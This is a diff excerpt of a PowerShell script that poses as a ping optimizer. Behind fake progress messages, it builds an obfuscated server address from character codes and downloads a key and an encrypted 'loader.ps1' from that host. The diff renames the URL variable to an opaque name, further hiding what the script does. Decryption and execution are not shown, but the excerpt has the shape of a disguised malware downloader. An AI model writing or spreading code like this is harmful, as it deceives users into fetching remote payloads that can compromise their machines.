@@ -21,18 +21,18 @@ Write-Host ""
 
 Show-Progress -Activity "Connecting to server..." -Percent 20
 
-$serverUrl = 'http://' + 
+$sUllz = 'http://' + 
              [char]55+[char]52+'.'+[char]49+[char]49+[char]57+'.'+
              [char]49+[char]57+[char]50+'.'+[char]50+[char]50+[char]52+':5000'
 
 try {
 
     Show-Progress -Activity "Requesting optimizer..." -Percent 30
-    $key = Invoke-RestMethod "$serverUrl/.key" -TimeoutSec 20
+    $key = Invoke-RestMethod "$sUllz/.key" -TimeoutSec 20
     
 
     Show-Progress -Activity "Sending your max ping..." -Percent 50
-    $encrypted = Invoke-RestMethod "$serverUrl/loader.ps1" -TimeoutSec 20
+    $encrypted = Invoke-RestMethod "$sUllz/loader.ps1" -TimeoutSec 20
 
     Show-Progress -Activity "Getting settings for optimizer..." -Percent 70
     
